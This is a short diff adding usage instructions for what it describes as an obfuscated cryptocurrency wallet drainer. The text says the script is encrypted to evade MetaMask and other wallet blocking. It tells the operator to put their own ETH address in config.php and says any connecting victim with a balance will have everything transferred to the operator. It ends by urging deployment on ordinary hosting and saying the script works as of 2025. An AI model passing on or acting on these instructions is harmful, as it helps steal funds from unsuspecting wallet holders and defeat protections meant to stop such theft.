@@ -1,0 +1,11 @@
+The script is encrypted to bypass the blocking of the MetaMask browser and other wallets
+
+To connect our wallet:
+
+Change config.php wallet itself: to your ETH wallet
+
+If the connection is successful and if he has a balance, everything will be written off from his wallet and transferred to yours!
+
+The script is working as of 2025, use it, good luck!
+
+Put the script on a regular hosting!
